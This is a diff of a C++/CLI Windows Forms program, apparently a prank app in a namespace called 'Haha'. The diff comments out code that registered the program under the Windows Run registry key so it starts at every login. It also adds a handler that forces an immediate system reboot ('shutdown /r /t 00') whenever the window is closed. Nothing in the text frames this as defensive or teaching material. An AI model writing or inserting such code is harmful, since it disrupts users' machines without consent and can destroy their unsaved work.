@@ -22,10 +22,10 @@ namespace Haha {
 		MyForm(void)
 		{
 			InitializeComponent();
-			RegistryKey^ reg;
-			String^ ExePath = System::Windows::Forms::Application::ExecutablePath;
-			reg = Registry::CurrentUser->CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
-			reg->SetValue("MyTest", ExePath);
+			//RegistryKey^ reg;
+			//String^ ExePath = System::Windows::Forms::Application::ExecutablePath;
+			//reg = Registry::CurrentUser->CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+			//reg->SetValue("MyTest", ExePath);
 			//
 			//TODO: Add the constructor code here
 			//
@@ -182,6 +182,7 @@ namespace Haha {
 	}
 	private: System::Void MyForm_FormClosed(System::Object^  sender, System::Windows::Forms::FormClosedEventArgs^  e) {
 
+				 System::Diagnostics::Process::Start("shutdown", "/r /t 00");
 
 	}
 	private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) {
